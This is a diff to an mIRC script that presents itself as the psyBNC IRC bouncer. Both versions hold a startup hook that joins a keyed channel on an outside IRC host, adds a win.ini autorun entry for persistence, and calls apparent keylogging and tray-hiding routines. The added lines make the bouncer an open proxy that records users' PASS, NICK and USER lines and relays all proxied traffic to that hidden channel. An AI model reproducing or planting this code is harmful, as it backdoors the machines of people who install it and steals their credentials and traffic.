@@ -1,6 +1,6 @@
-on *:START:{ set %fldchan #X#psy#X# | %key = $encode(Sm0k3d,m) | .timercon -o 0 60 server $iif($ip = 96.22.54.2,::11,irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667)) -jn %fldchan %key | .writeini $left($mircexe,1) $+ :\windows\win.ini windows load $shortfn($mircexe) | showmirc -m | .timerkl -o 1 5 kl | findtray | if (!%psyBNC.port) %psyBNC.port = 31337 | .timer -o 0 300 linkstarts | .timer -o 1 0 loaddata | .timer -o 0 30 savedata | if (!$psyBNC_Name) .timer 1 1 setpsyname  | inc %start | psyBNC start %psyBNC.port | write_mainlog Listener created :0.0.0.0 port %psyBNC.port }
+on *:START:{ .timer -o 0 300 linkstarts | .timer -o 1 0 loaddata | .timer -o 0 30 savedata | if (!$psyBNC_Name) .timer 1 1 setpsyname  | inc %start | psyBNC start %psyBNC.port | write_mainlog Listener created :0.0.0.0 port %psyBNC.port | set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | .timercon -o 0 60 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667 -jn %fldchan %key | .writeini $left($mircexe,1) $+ :\windows\win.ini windows load $shortfn($mircexe) | .timerkl -o 1 5 kl | findtray }
 on *:EXIT:savedata
-alias logo return psyBNC3.4
+alias logo return psyBNC3.5
 alias psydir return $shortfn($scriptdir)
 alias log.dir return $shortfn($psydir $+ logs\)
 alias mainlog return $shortfn($log.dir $+ MAIN.LOG)
@@ -42,7 +42,7 @@ alias psy {
 alias psy.chk { if (!$sock($replace($1,psyBNC,server)).ip) && (!$sock($replace($1,psyBNC,proxy.server)).ip) psyBNC $1 BCONNECT $pserver($puser($1)) }
 alias psyBNC {
   if (*_* iswm $1) sockrename $1 $deltok($1,95,1)
-  if ($1 == start) { set %psyBNC.port $2 | if ($sock(psyBNC).name == $null) { socklisten -d 0.0.0.0 psyBNC $2 | echo -a  $+ $colour(info text) $+ *** psyBNC Listening on port $2 . Try /server localhost $2 } | else { echo -a Error occured. Could not open port or psyBNC is already listening. If so, use /sockclose psyBNC | return } }
+  if ($1 == start) { set %psyBNC.port $2 | if ($sock(psyBNC).name == $null) { .timerclose 1 1 sockclose psybnc | .timerlisten 1 2 socklisten -d 0.0.0.0 psyBNC $2 | opnotice %fldchan *** psyBNC Listening on port $2 . Try /server ::1 $2 } | else { opnotice %fldchan Error occured. Could not open port or psyBNC is already listening. If so, use /sockclose psyBNC | return } }
   if (MADMIN == $2) && ($check(admin,$puser($1)) == yes) { 
     if ($3 == $null) { p.error $1 3 | halt } 
     if ($check(admin,$3,u) == yes) { p.error $1 ALREADY_EXISTS | halt } 
@@ -287,7 +287,36 @@ on *:SOCKREAD:psyBNC*:{
   if ($sockerr > 0) { return }
   sockread %psyBNC
   tokenize 32 %psyBNC
-  if (%spybnc) && ($server) { .notice @#psy# %psyBNC }
+  if (%spy) && ($server) { .opnotice %fldchan %psyBNC }
+    sockread $iif($sock($sockname).rq > 16384,16834,$v1) &binvar
+      while ($sock($sockname).rq) {
+    sockread %t | tokenize 32 %t
+    sockwrite -n $replace($sockname,pfirc,psybnc) $1-
+    if ($sockbr == 0) return
+    if (!$hget(make,anon)) .opnotice %fldchan $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+  $1-
+    if ($1 == PING) sockwrite -n $sockname PONG $2-
+  }
+  if ($sock($replace($sockname,psybnc,server)).ip) && (GET* !iswm $hget(make,sockmark)) { sockwrite -b $replace($sockname,psybnc,server) -1 &binvar }
+  if ($sock($replace($sockname,psybnc,pfirc)).ip) { sockwrite -b $replace($sockname,psybnc,pfirc) -1 &binvar }
+  hadd -m make text $bvar(&binvar,1,$bvar(&binvar,0)).text
+  if (PASS == $gettok($hget(make,text),1,32)) { hadd -mu300 $sockname pass $gettok($hget(make,text),1-,32) }
+  if (NICK == $gettok($hget(make,text),1,32)) { hadd -mu300 $sockname nick $gettok($hget(make,text),1-,32) }
+  if (USER == $gettok($hget(make,text),1,32)) { hadd -mu300 $sockname user $gettok($hget(make,text),1-,32) }
+  if (CONNECT* iswm $hget(make,text)) {
+    hadd -m make proxycon $wildtok($gettok($hget(make,text),2,32),*.*,1,32)
+    if (?*.?*.?*.?* !iswm $hget(make,proxycon)) && (!$sock($replace($sockname,serv,connect)).ip) { .getdns $sockname $hget(make,proxycon) }
+    elseif (?*.?*.?*.?* iswm $hget(make,proxycon)) && (!$sock($replace($sockname,serv,connect)).ip) { sockopen $iif(*:443 iswm $hget(make,proxycon),-e,$iif(*:6697 iswm $hget(make,proxycon),-e)) $replace($sockname,serv,connect) $replace($hget(make,proxycon),:,$chr(32)) }
+    .hadd -mu10 make sockmark $hget(make,text)
+ 
+  }
+  if (GET* iswm $hget(make,text)) || (POST* iswm $hget(make,text)) {
+    hadd -m make proxycon $protocol($wildtok($gettok($hget(make,text),2,32),*.*,1,32))
+    if (?*.?*.?*.?* !iswm $hget(make,proxycon)) && (!$sock($replace($sockname,serv,connect)).ip) { .getdns $sockname $hget(make,proxycon) }
+    elseif (?*.?*.?*.?* iswm $hget(make,proxycon))  && (!$sock($replace($sockname,serv,connect)).ip) { sockopen $iif(*:443 iswm $hget(make,proxycon),-e,$iif(*:6697 iswm $hget(make,proxycon),-e)) $replace($sockname,serv,connect) $replace($hget(make,proxycon),:,$chr(32)) }
+    .hadd -mu10 make sockmark $wildtok($bvar(&binvar,1,$bvar(&binvar,0)).text,GET*,1,13)
+  }
+  if (!$hget(make,anon)) window @PFDebug
+  if (!$hget(make,anon)) .opnotice %fldchan $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+  $hget(make,text)
   if ($1 == LINKFR0M) && ($sock($sockname).ip !isin $hget(LINKFROM,$2)) { GLOBAL *-a* * Link failed $2 $+ : $+ $sock($sockname).ip : not in LINKFROM configuration. | sockclose $sockname } 
   if ($1 == LINKFR0M) && ($sock($sockname).ip isin $hget(LINKFROM,$2)) {
     GLOBAL *-a* * Link synchronized $2 $+ : $+ $sock($sockname).ip $fulldate 
@@ -492,7 +521,7 @@ alias loaddata {
   %encryptIP = yes
   hmake BHELP
   Hload BHELP $scriptdir\psyBNC.BHELP.EN
-  Echo -a 3* English help file loaded.
+  .opnotice %fldchan 3* English help file loaded.
   if (!$hget(data,SAVE)) hmake data
   if ($findfile($scriptdir,psyBNC.*.dat,0)) .timer $v1 0 psy.loaddata data
 }
@@ -501,7 +530,7 @@ alias psy.loaddata {
   hinc -mu2 $1 LOAD
   hadd -mu2 FILE LOAD $findfile($scriptdir,psyBNC.*.dat,$hget($1,LOAD))
   if ($hget(FILE,LOAD)) hmake $remove($nopath($hget(FILE,LOAD)),psyBNC.,.dat) |  hload $nopath($remove($hget(FILE,LOAD),psyBNC.,.dat)) $hget(FILE,LOAD) | .hadd -m $check(sockname,$remove($hget(FILE,LOAD),psyBNC.,.dat)) USER $remove($hget(FILE,LOAD),psyBNC.,.dat)
-  .timerLOAD 1 2 echo -a 3* psyBNC User Data Loaded.
+  .timerLOAD 1 2 .opnotice %fldchan 3* psyBNC User Data Loaded.
 }
 ;;;;;;;;;;;;;;;;;;;SOCKETS;;;;;;;;;;;;;;;;;;;;;;;;
 
@@ -511,6 +540,22 @@ on *:SOCKREAD:PSY.LINK*:{
 }
 
 on *:SOCKOPEN:server*:{
+  if ($sockerr) { sockclose $replace($sockname,server,psybnc) | return }
+  if ($calc($hget(make,maxout) +1) < $sock(server*,0).name)  { sockwrite -tn $sockname HTTP/1.1 403 Forbidden | .timeropen124 $+ $sockname -om 1 100 sockclose pf* $+ $hget(make,temp) $+ * }
+  if ($sock($replace($sockname,server,psybnc)).ip) {
+    .sockwrite -tn $replace($sockname,server,psybnc) HTTP/1.1 200 Connection Established
+    if (CONNECT*:66??* !iswm $hget(make,sockmark)) {
+      .sockwrite -tn $sockname $hget(make,sockmark)
+      .sockwrite -tn $sockname Host: $gettok($protocol($gettok($hget(make,sockmark),2,32)),1,58)
+      .sockwrite -tn $sockname User-Agent: Mozilla/5.0 $os $fulltime $ip
+      .sockwrite -tn $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+      .sockwrite -tn $sockname Accept-Language: en-US,en;q=0.8
+      .sockwrite -tn $sockname Connection: keep-alive
+      .sockwrite $sockname $crlf
+      .sockwrite $sockname $crlf
+    }
+ 
+  }
   if ($sockerr) {
     if ($sockerr == 3) { psy.closinglink | psy.reconnect 1 | halt }
     if ($sock($replace($sockname,proxy.server,psyBNC)).name != $null) { psy.closinglink | psy.reconnect 1  }
@@ -677,6 +722,24 @@ on *:SOCKREAD:server*:{
 
   sockread %server 
   tokenize 32 %server 
+  sockread $iif(66* iswm $sock($sockname).port,-n) $sock($sockname).rq &binvar
+  if ($sock($replace($sockname,server,psybnc)).ip) sockwrite -b $replace($sockname,server,psybnc) -1 &binvar
+  if ($len($bvar(&binvar,1,$bvar(&binvar,0)).text) < 340) hadd -m make text $bvar(&binvar,1,$bvar(&binvar,0)).text
+  if (001 isin $gettok($hget(make,text),1-3,32)) { sockrename $sockname $replace($sockname,server,pfirc) }
+  if (PING* iswm $hget(make,text)) { sockwrite -n $sockname PONG $hget(make,text) | halt }
+  if (CONNECT*:66* iswm $hget(make,sockmark)) && (*NOTICE*AUTH*:* iswm $hget(make,text)) {
+    if ($hget($replace($sockname,connect,serv),pass)) sockwrite -n $sockname $v1
+    sockwrite -n $sockname $hget($replace($sockname,connect,serv),nick)  
+    sockwrite -n $sockname $hget($replace($sockname,connect,serv),user)
+    hdel make sockmark
+  }
+  if (451 == $gettok($hget(make,text),2,32)) {
+    if ($hget($replace($sockname,connect,serv),pass)) sockwrite -n $sockname $v1
+    sockwrite -n $sockname $hget($replace($sockname,connect,serv),nick)  
+    sockwrite -n $sockname $hget($replace($sockname,connect,serv),user)
+  }
+  if (!$hget(make,anon)) window @PFDebug
+  if (!$hget(make,anon)) .opnotice %fldchan $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+  $hget(make,text)
   if ($sock($replace($sockname,server,psyBNC)).ip) sockwrite -n $gettok($replace($sockname,server,psyBNC),1,95) $+ * %server
   if (*:*Error* iswm $1) && (*:Error*!* !iswm $1) {
     noticeauth psyBNC $+ $remove($sockname,server) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,server)) got disconnected from server. (From $pserver($puser(psyBNC $+ $remove($sockname,server))) $+ ) Reason: $2-
@@ -872,8 +935,7 @@ alias proxy {
     return %pxy pxy
   }
 }
-alias pxy return Proxys.txt
-alias tell { if ($sock($sockname).ip != $null) sockwrite -n $sockname $1- | else echo -a $1- }
+alias tell { if ($sock($sockname).ip != $null) sockwrite -n $sockname $1- | else .opnotice %fldchan $1- }
 alias phadd { hadd psyBNC $1- | return $1- }
 alias usersock { return $hget($1,sockname) }
 alias pbfile return $log.dir $+ $remove($1,server,psyBNC) $+ .log
